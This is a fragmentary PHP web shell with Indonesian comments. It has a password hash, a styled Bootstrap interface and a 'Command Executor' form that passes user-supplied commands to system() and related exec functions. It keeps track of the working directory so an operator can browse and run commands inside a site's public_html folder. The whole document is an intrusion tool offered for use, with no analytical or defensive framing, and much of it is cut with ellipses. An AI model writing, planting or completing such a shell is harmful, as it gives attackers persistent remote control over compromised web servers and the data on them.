...
$PASSWORD_HASH = '$2y$10$6eNsvSNiDol3Ei5CceJ0nu.6OUuNpneLDfkSYr88I4Yn7NVicBb.e'; 
...
<style>
/* Ubah semua teks hitam menjadi putih */
body, td, th, tr, table, span, div {
...
/* Ikon folder menjadi putih */
img[src*="folder"], img[src*="dir"], img[src*="directory"] {
...
<nav class="navbar navbar-dark" style="background-color:#1e1e1e;">
  <div class="container-fluid">
    <a class="navbar-brand" href="?">
      <img src="https://i.gyazo.com/0b785f3814f29a85c3cfddaac5cd886d.png" width="50" height="50" alt="">
    </a>
...
<div class="container mt-3">
  ...
  <!-- FITUR COMMAND -->
  <h5>Command Executor</h5>
<form method="post">
  <div class="input-group mb-3">
    <input type="text" name="cmd" class="form-control" placeholder="Masukkan command (contoh: ls -la)">
...
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd(); // default public_html
}
...
function runCommand($cmd) {
    ...
    if (function_exists('system')) {
        ...
        $output = "Semua fungsi exec dimatikan!";
    }
...
if (!empty($_POST['cmd'])) {
    ...
    // kalau command dimulai dengan cd
    if (strpos($command, "cd ") === 0) {
        ...
        if ($dir == "..") {
            ...
            $newPath = $_SESSION['cwd'] . "/" . $dir;
            if (is_dir($newPath)) {
                chdir($newPath);
                $_SESSION['cwd'] = getcwd();
            } else {
                $output = "Directory tidak ditemukan: $dir";
            }
        }
        if (!isset($output)) {
        ...
        // jalankan command dari folder aktif
        chdir($_SESSION['cwd']);
        $output = runCommand($command);
    }

    echo "<pre class='output'>$ " . htmlspecialchars($command) . "\n";
...
?>
    ...
    echo ('
<nav class="navbar navbar-light" style="background-color:#1e1e1e;">
  <div class="navbar-brand">
  <a href="?"><img src="https://i.gyazo.com/0b785f3814f29a85c3cfddaac5cd886d.png" width="50" height="50" alt=""></a>
');
